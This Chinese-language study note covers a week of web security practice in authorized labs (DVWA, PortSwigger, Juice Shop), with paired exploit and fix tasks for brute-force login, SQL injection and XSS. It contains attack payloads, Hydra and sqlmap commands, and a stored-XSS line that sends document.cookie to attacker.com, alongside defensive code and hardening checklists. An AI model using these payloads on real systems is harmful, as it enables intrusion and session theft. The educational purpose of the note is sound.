---
title: Day042：Web 安全 - 周综合实验与测评（Top 10 选题）
tags:
  - 网络
  - 安全
  - 学习计划
categories:
  - 网络安全
abbrlink: 6f6157ef
date: 2026-02-04 00:00:00
updated: 2026-02-04 00:00:00
---

# Day042：Web 安全 - 周综合实验与测评（Top 10 选题）

- 日期：2026-02-04
- 周次：第6周

## 学习目标

今天你将完成**第 6 周综合实验**，整合本周 Web 安全知识：

- **深入理解 OWASP Top 10**：掌握 2-3 种常见 Web 漏洞的原理与防护
- **授权靶场实战**：在合法环境中验证漏洞与修复
- **输出安全报告**：形成完整的技术报告与改进建议
- **建立防护体系**：设计项目的安全基线

---

<!--more-->

## 学习内容

### 1️⃣ 本周知识回顾

#### 1.1 OWASP Top 10 核心要点

| 排名 | 风险 | 核心概念 | 防护要点 |
|------|------|---------|----------|
| **A01** | 访问控制失效 | 水平/垂直越权、IDOR | 权限检查、对象级别授权 |
| **A03** | 注入攻击 | SQLi、XSS、命令注入 | 输入验证、参数化查询 |
| **A05** | 安全配置错误 | 默认配置、信息泄露 | 硬化配置、最小权限 |
| **A07** | 身份认证失效 | 弱密码、会话固定 | 强认证、安全会话管理 |

#### 1.2 本周实验靶场

**推荐靶场**：

1. **PortSwigger Web Security Academy**
   - 免费的 Web 安全学习平台
   - 包含详细的漏洞原理和修复指导
   - https://portswigger.net/web-security

2. **OWASP Juice Shop**
   - 故意编写的存在漏洞的 Web 应用
   - 覆盖多种 OWASP Top 10 漏洞
   - https://owasp.org/www-project-juice-shop/

3. **DVWA（Damn Vulnerable Web Application）**
   - 基于 PHP/MySQL 的漏洞靶场
   - 适合本地搭建练习
   - 难度分级（Low/Medium/High）

---

### 2️⃣ 靶场实验：选择与配置

#### 2.1 在线靶场实验（推荐）

**PortSwigger Web Security Academy 实验步骤**：

1. **注册账号并选择实验**
   - 访问 https://portswigger.net/web-security
   - 选择 "Access control vulnerabilities" 或 "SQL injection"
   - 阅读漏洞原理说明

2. **完成实验任务**
   - 按照指导逐步利用漏洞
   - 记录攻击步骤和观察结果
   - 对比修复后的版本

3. **记录实验结果**

```markdown
## 实验记录模板

### 实验名称
SQL Injection - Lab 1

### 漏洞类型
CWE-89: SQL Injection

### CVSS 评分
8.6 (High)

### 漏洞原理
应用程序将用户输入直接拼接到 SQL 查询中，未进行参数化处理。

### 利用步骤
1. 访问产品页面 URL 参数包含 category 参数
2. 尝试注入：`' OR 1=1--`
3. 成功获取所有产品数据
4. 利用 UNION 查询获取管理员密码哈希

### 修复方案
使用参数化查询：
```python
# 修复前（不安全）
query = "SELECT * FROM products WHERE category = '" + category + "'"

# 修复后（安全）
query = "SELECT * FROM products WHERE category = ?"
cursor.execute(query, (category,))
```

### 防护效果
修复后无法进行 SQL 注入攻击。
```

#### 2.2 本地靶场实验（DVWA）

**DVWA 安装与配置**：

```bash
# 1. 安装 Docker（如果未安装）
# Windows: https://docker.com
# Linux: curl -fsSL https://get.docker.com | sh

# 2. 启动 DVWA 容器
docker run --rm -it -p 8080:80 -p 8443:443 \
  -e MYSQL_ROOT_PASSWORD=root \
  -e DVWA_DB_HOST=dvwa-mysql \
  --link dvwa-mysql:mysql \
  vulnerables/web-application-dvwa

# 3. 单独启动 MySQL（需要两个容器）
docker run --name dvwa-mysql -e MYSQL_ROOT_PASSWORD=root -d mysql:5.7

# 4. 访问 DVWA
# 打开浏览器访问 http://localhost:8080
# 默认账号: admin / password
```

---

### 3️⃣ 实验任务

#### 任务 1（必做）：身份认证漏洞利用与修复

**目标**：利用并修复身份认证相关漏洞。

**实验内容**：

1. **暴力破解攻击**

```bash
# 使用 Hydra 进行暴力破解
hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Login failed"

# 使用 Burp Suite Intruder
# 1. 拦截登录请求
# 2. 发送到 Intruder
# 3. 设置 payload（用户名/密码列表）
# 4. 发起攻击并分析响应
```

2. **防护措施**

```python
# 实现账户锁定机制
class AccountLockout:
    def __init__(self, max_attempts: int = 5, lockout_duration: int = 900):
        self.max_attempts = max_attempts
        self.lockout_duration = lockout_duration
        self.redis = redis.Redis()
    
    def check_lockout(self, username: str) -> bool:
        key = f"lockout:{username}"
        return self.redis.exists(key) > 0
    
    def record_failed_attempt(self, username: str):
        key = f"failed:{username}"
        self.redis.incr(key)
        self.redis.expire(key, self.lockout_duration)
        
        if int(self.redis.get(key)) >= self.max_attempts:
            lock_key = f"lockout:{username}"
            self.redis.setex(lock_key, self.lockout_duration, "1")
    
    def reset_failed_attempts(self, username: str):
        key = f"failed:{username}"
        self.redis.delete(key)
```

3. **安全登录实现**

```python
# 安全的登录实现
@app.route('/login', methods=['POST'])
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    
    # 检查账户锁定
    if account_lockout.check_lockout(username):
        return jsonify({
            'error': 'Account locked',
            'retry_after': 900
        }), 429
    
    # 验证凭据（使用 bcrypt）
    user = db.get_user_by_username(username)
    if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
        # 记录成功登录
        security_logger.log_login_attempt(
            username, request.remote_addr, request.headers.get('User-Agent'),
            success=True, request_id=g.request_id
        )
        
        # 重置失败计数
        account_lockout.reset_failed_attempts(username)
        
        # 生成 JWT
        access_token = jwt.create_access_token(user.id, user.roles)
        refresh_token = jwt.create_refresh_token(user.id)
        
        return jsonify({
            'access_token': access_token,
            'refresh_token': refresh_token,
            'expires_in': 900
        })
    else:
        # 记录失败登录
        security_logger.log_login_attempt(
            username, request.remote_addr, request.headers.get('User-Agent'),
            success=False, request_id=g.request_id,
            failure_reason='invalid_credentials'
        )
        
        # 记录失败尝试
        account_lockout.record_failed_attempt(username)
        
        return jsonify({'error': 'Invalid credentials'}), 401
```

---

#### 任务 2（必做）：SQL 注入漏洞利用与修复

**目标**：利用并修复 SQL 注入漏洞。

**实验内容**：

1. **SQL 注入攻击演示**

```bash
# 1. 基础 UNION 注入
# 原始查询: SELECT * FROM products WHERE category = 'electronics'
# 注入: ' UNION SELECT username, password, email FROM users--

# 2. 盲注（当无错误回显时）
# 基于时间: ' OR IF(1=1, SLEEP(5), 0)--
# 基于布尔: ' AND 1=1-- 和 ' AND 1=2--

# 3. 使用 SQLMap（仅限授权靶场）
sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1" \
  --cookie="PHPSESSID=xxx; security=low" \
  --dbs  # 枚举数据库
```

2. **修复方案**

```python
# 参数化查询（推荐）
def get_products(category: str) -> list[dict]:
    query = "SELECT * FROM products WHERE category = ?"
    cursor.execute(query, (category,))
    return cursor.fetchall()

# ORM 查询（更安全）
products = Product.query.filter(Product.category == category).all()

# 存储过程
cursor.callproc('get_products', [category])
```

3. **输入验证**

```python
from pydantic import BaseModel, validator
import re

class ProductQuery(BaseModel):
    category: str
    
    @validator('category')
    def validate_category(cls, v):
        # 允许字母、数字、下划线
        if not re.match(r'^[a-zA-Z0-9_]+$', v):
            raise ValueError('Invalid category format')
        return v
```

---

#### 任务 3（必做）：XSS 漏洞利用与修复

**目标**：利用并修复跨站脚本攻击漏洞。

**实验内容**：

1. **XSS 攻击类型**

```html
<!-- 反射型 XSS -->
<!-- URL: https://example.com/search?q=<script>alert(document.cookie)</script> -->

<!-- 存储型 XSS -->
<!-- 提交评论: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script> -->

<!-- DOM 型 XSS -->
<!-- URL: #name=<img src=x onerror=alert(1)> -->
<script>
  document.getElementById('name').innerHTML = location.hash.substring(1);
</script>
```

2. **防护措施**

```python
import html
from bleach import clean

# HTML 转义（基础）
@app.template_filter('escape')
def escape_filter(s):
    return html.escape(str(s))

# 使用 Bleach 库（推荐）
def sanitize_html(html_content: str) -> str:
    allowed_tags = ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li']
    allowed_attributes = {'a': ['href', 'title']}
    
    cleaned = clean(
        html_content,
        tags=allowed_tags,
        attributes=allowed_attributes,
        strip=True
    )
    return cleaned

# Content Security Policy
@app.after_request
def add_csp(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' https://cdn.example.com; "
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
        "img-src 'self' data: https:; "
        "object-src 'none';"
    )
    return response
```

---

#### 任务 4（进阶）：完整安全加固

**目标**：对靶场应用进行完整的安全加固。

**加固清单**：

```markdown
## Web 应用安全加固清单

### 1. 认证与授权
- [ ] 实现强密码策略（12位+大小写+数字+特殊字符）
- [ ] 实现账户锁定机制（5次失败锁定15分钟）
- [ ] 实现双因素认证（2FA）
- [ ] 使用安全的会话管理（HttpOnly, Secure, SameSite）
- [ ] 实现基于角色的访问控制（RBAC）

### 2. 输入验证
- [ ] 所有用户输入进行验证
- [ ] 使用参数化查询防 SQL 注入
- [ ] HTML 内容进行过滤和转义防 XSS
- [ ] 文件上传进行类型和大小限制

### 3. 错误处理
- [ ] 不向用户暴露详细错误信息
- [ ] 记录详细错误日志（内部）
- [ ] 实现统一的错误响应格式

### 4. 安全响应头
- [ ] X-Frame-Options: SAMEORIGIN
- [ ] X-Content-Type-Options: nosniff
- [ ] X-XSS-Protection: 1; mode=block
- [ ] Content-Security-Policy
- [ ] Strict-Transport-Security

### 5. 日志与监控
- [ ] 记录所有认证事件（成功/失败）
- [ ] 记录敏感操作
- [ ] 记录访问拒绝事件
- [ ] 实现异常检测

### 6. 服务器配置
- [ ] 隐藏服务器版本信息
- [ ] 禁用不必要的 HTTP 方法
- [ ] 配置 HTTPS（TLS 1.2+）
- [ ] 禁用目录列出
```

---

## 巩固练习（题与复盘）

### 练习 1：总结最有效的防护策略

**任务**：总结本周学习到的最有效的 Web 防护策略。

**答案**：

| 策略 | 效果 | 实施难度 |
|------|------|----------|
| **参数化查询** | 防止 SQL 注入 | 低 |
| **输入验证** | 防止多种注入攻击 | 中 |
| **输出编码** | 防止 XSS | 中 |
| **安全响应头** | 多层防御 | 低 |
| **最小权限** | 减少攻击面 | 中 |
| **安全编码规范** | 从源头防止漏洞 | 高 |

### 练习 2：完善项目安全基线

**任务**：为你的项目制定安全基线检查清单。

**答案**：

```markdown
## 项目安全基线检查清单

### 代码层面
- [ ] 无硬编码的密码/密钥
- [ ] 无 SQL 注入（使用参数化查询）
- [ ] 无 XSS（输出编码）
- [ ] 无 CSRF（Token 验证）
- [ ] 敏感数据加密存储

### 配置层面
- [ ] 调试模式关闭
- [ ] 错误信息不暴露给用户
- [ ] 安全响应头已配置
- [ ] HTTPS 已启用
- [ ] CORS 配置合理

### 运维层面
- [ ] 依赖库无已知漏洞
- [ ] 日志已配置（不包含敏感信息）
- [ ] 监控告警已配置
- [ ] 定期安全扫描已执行
```

---

## 评估标准（达成判定）

- ✅ 在授权靶场完成 2-3 个漏洞利用实验
- ✅ 理解漏洞原理并能解释
- ✅ 实现修复方案并验证效果
- ✅ 撰写完整的安全报告
- ✅ 制定项目安全基线

---

## 学习成果达成情况（由学习者填写）

### 截图与证据

- [ ] 靶场实验完成截图
- [ ] 漏洞利用截图（授权环境）
- [ ] 修复验证截图
- [ ] 安全报告截图

### 关键命令与输出

**SQL 注入利用**：
```bash
# 注入前
$ curl "http://dvwa.local/vulnerabilities/sqli/?id=1"
[{"id":"1","first_name":"admin","last_name":"user"}]

# 注入后
$ curl "http://dvwa.local/vulnerabilities/sqli/?id=1' UNION SELECT user,password,email FROM users--"
[{"id":"admin","first_name":"$2y$10$...","":""}]
```

**修复后验证**：
```bash
$ curl "http://dvwa.local/vulnerabilities/sqli/?id=1' UNION SELECT user,password,email FROM users--"
{"error":"Invalid input"}
```

### 结论与反思

**本周学习总结**：

- 理解了 OWASP Top 10 的核心漏洞类型
- 掌握了 SQL 注入、XSS、认证失效的原理
- 学会了如何修复常见 Web 漏洞
- 了解了安全开发的重要性

**技术收获**：

1. 参数化查询是防止 SQL 注入的最佳实践
2. 输出编码是防止 XSS 的核心措施
3. 多层防御（深度防御）比单一措施更有效
4. 安全编码需要从设计阶段开始

**不足与改进**：

- 对复杂漏洞组合利用理解不深
- 需要更多实际项目中的安全审计经验
- WAF 规则调优需要进一步学习

**下周学习计划**：

- 学习防火墙与网络防护
- 掌握日志分析与安全监控
- 实践安全事件响应

**本次实验耗时**：约 4 小时

**掌握程度自评**：

- [ ] 😕 理解了基本概念
- [ ] 🙂 完成了基础任务
- [ ] 😃 完成了所有任务并理解原理
- [ ] 🤩 深入研究了高级利用技巧

---
---
# Day042：Web 安全 - 周综合实验与测评（Top 10 选题）

- 日期：2026-02-04
- 周次：第6周

## 学习目标
- 完成两个以上 OWASP 风险的演示与修复
- 形成周报与检查清单

<!--more-->

## 学习内容
- 汇总演示、修复方案与证据
- 记录误报与边界

## 实践任务（合法授权范围内）
- 在靶场选择 2-3 项 Top 10 风险进行演示与修复
- 输出报告与检查清单

## 巩固练习（题与复盘）
- 题目：总结最有效的防护策略
- 练习：完善项目的安全基线

## 评估标准（达成判定）
- 周报完整、证据充分
- 提出后续优化计划

## 学习成果达成情况（由学习者填写）
- 截图与证据：
- 关键命令与输出：
- 结论与反思：


## 集中参考答案（含思路）

### 题 1 参考答案

（待补充）


## 学习成果示例填写（可照抄）

> 可将"示例"内容替换为你自己的时间与截图文件名。

### 截图与证据（示例）

- 任务 1：`images/dayXXX_task1.png`

### 关键命令与输出（示例）

```
命令示例：
输出示例：
```

### 结论与反思（示例）

**我今天搞清楚了**：
- （示例）理解了核心概念

**我差点搞混的是**：
- （示例）某个易混淆点

**明天我要继续补的是**：
- （示例）下一步深入方向

**本次学习耗时**：约 2 小时

**掌握程度自评**：
- [x] 😃 完成了所有任务并理解原理
